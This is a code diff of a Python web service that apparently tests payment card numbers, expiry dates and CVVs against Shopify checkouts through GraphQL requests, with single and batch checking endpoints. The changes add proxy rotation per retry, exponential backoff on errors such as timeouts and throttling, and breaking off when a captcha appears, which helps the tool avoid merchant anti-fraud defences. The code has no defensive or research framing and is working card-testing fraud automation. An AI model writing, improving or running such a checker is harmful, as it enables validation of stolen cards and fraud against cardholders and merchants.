@@ -149,8 +149,6 @@ async def make_graphql_request_with_captcha_handling(
     session, graphql_url, params, headers, json_data, 
     checkout_url, max_retries=1, solve_captcha=True
 ):
-    original_variables = json_data.get('variables', {}).copy()
-    
     for attempt in range(max_retries + 1):
         try:
             response = await session.post(graphql_url, params=params, headers=headers, json=json_data)
@@ -160,7 +158,7 @@ async def make_graphql_request_with_captcha_handling(
         except Exception as e:
             if attempt == max_retries:
                 return None, str(e), False
-            await asyncio.sleep(1)
+            await asyncio.sleep(0.5)
     
     return response, response_text, False
 
@@ -520,8 +518,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                     session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
                 )
+                if is_captcha_required(resp_text):
+                    break
                 if i == 0:
-                    await asyncio.sleep(0.3)
+                    await asyncio.sleep(0.5)
             
             if not response:
                 return False, f"Request failed: {resp_text}", gateway, total_price, currency
@@ -1070,14 +1070,47 @@ def get_event_loop():
             logger.info(f"[ENGINE] Event loop (re)created in PID {os.getpid()}")
     return _loop
 
-async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_str):
-    """Process a single card, guarded by the concurrency semaphore."""
+async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_list, start_proxy_idx=0):
+    """Process a single card, guarded by the concurrency semaphore, with smart retry & proxy rotation."""
     global _active_cards, _total_processed
+    max_retries = 3
     async with _semaphore:
         with _stats_lock:
             _active_cards += 1
         try:
-            return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
+            for attempt in range(max_retries):
+                # Rotate proxy on each attempt (if multiple proxies are provided)
+                if isinstance(proxy_list, list) and proxy_list:
+                    current_proxy = proxy_list[(start_proxy_idx + attempt) % len(proxy_list)]
+                elif isinstance(proxy_list, str):
+                    current_proxy = proxy_list
+                else:
+                    current_proxy = None
+                
+                try:
+                    success, msg, gw, price, cur = await process_card(cc, mes, ano, cvv, site_url, variant_id, current_proxy)
+                    
+                    # Check for transient errors that should be retried
+                    error_msg_lower = str(msg).lower()
+                    transient_errors = ['proxy error', 'timeout', 'clientoserror', 'clientconnectorerror', 
+                                       'serverdisconnectederror', 'error processing card', 
+                                       'failed to get session token', 'request failed', 'throttled',
+                                       'captcha_required', 'invalid json response']
+                    is_transient = any(t in error_msg_lower for t in transient_errors)
+                    
+                    if not success and is_transient and attempt < max_retries - 1:
+                        delay = (1.5 ** attempt) + random.uniform(0, 0.5)
+                        logger.info(f"[RETRY] Attempt {attempt+1}/{max_retries} for {cc[:6]}... | Error: {msg[:60]}")
+                        await asyncio.sleep(delay)
+                        continue
+                        
+                    return success, msg, gw, price, cur
+                except Exception as e:
+                    if attempt < max_retries - 1:
+                        delay = (1.5 ** attempt) + random.uniform(0, 0.5)
+                        await asyncio.sleep(delay)
+                        continue
+                    return False, f"Error after {max_retries} retries: {str(e)}", "UNKNOWN", "0.00", "USD"
         finally:
             with _stats_lock:
                 _active_cards -= 1
@@ -1118,10 +1151,11 @@ def shopify_checker():
         variant_id = request.args.get('variant')
         loop = get_event_loop()
 
+        proxy_list = [proxy_str] if proxy_str else []
         future = asyncio.run_coroutine_threadsafe(
             _throttled_process(
                 cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv'],
-                site, variant_id, proxy_str
+                site, variant_id, proxy_list, 0
             ),
             loop
         )
@@ -1169,31 +1203,44 @@ def batch_checker():
         if len(cards) > MAX_CONCURRENT:
             return jsonify({"error": f"Max {MAX_CONCURRENT} cards per batch", "status": False}), 400
 
-        # Parse all cards upfront and assign proxies round-robin
+        # Parse all cards upfront
         parsed = []
         for i, cc_string in enumerate(cards):
-            proxy_for_card = proxy_list[i % len(proxy_list)] if proxy_list else None
             try:
                 parts = parse_cc_string(cc_string.strip())
-                parsed.append((cc_string.strip(), parts, proxy_for_card))
+                parsed.append((cc_string.strip(), parts, i))
             except ValueError:
-                parsed.append((cc_string.strip(), None, proxy_for_card))
+                parsed.append((cc_string.strip(), None, i))
 
         loop = get_event_loop()
 
         async def _run_batch():
+            nonlocal variant_id
+            # Fetch variant once for the entire batch to save duplicate network requests
+            if not variant_id:
+                info = await fetch_products(site, proxy_list[0] if proxy_list else None)
+                if isinstance(info, dict) and info.get('variant_id'):
+                    variant_id = info['variant_id']
+                else:
+                    err_msg = info[1] if isinstance(info, tuple) else "Failed to fetch product / variant_id"
+                    tasks = []
+                    for cs, parts, idx in parsed:
+                        async def _fail(cs_val=cs): return cs_val, False, err_msg, "UNKNOWN", "0.00", "USD"
+                        tasks.append(_fail())
+                    return await asyncio.gather(*tasks)
+
             tasks = []
-            for cc_string, parts, px in parsed:
+            for cc_string, parts, idx in parsed:
                 if parts is None:
                     async def _bad(cs=cc_string):
                         return cs, False, "Invalid CC format", "UNKNOWN", "0.00", "USD"
                     tasks.append(_bad())
                 else:
-                    async def _check(cs=cc_string, p=parts, prx=px):
+                    async def _check(cs=cc_string, p=parts, current_idx=idx):
                         try:
                             success, msg, gw, price, cur = await _throttled_process(
                                 p['cc'], p['mes'], p['ano'], p['cvv'],
-                                site, variant_id, prx
+                                site, variant_id, proxy_list, current_idx
                             )
                             return cs, success, msg, gw, price, cur
                         except Exception as ex:
@@ -1228,6 +1275,11 @@ def status():
             "status": "GET /status"
         }
     })
+
+# ── Health check endpoint ───────────────────────────────────────────
+@app.route('/health', methods=['GET'])
+def health():
+    return jsonify({"status": "healthy"}), 200
 
 if __name__ == "__main__":
     print(f"[ENGINE] Max concurrency: {MAX_CONCURRENT} cards")
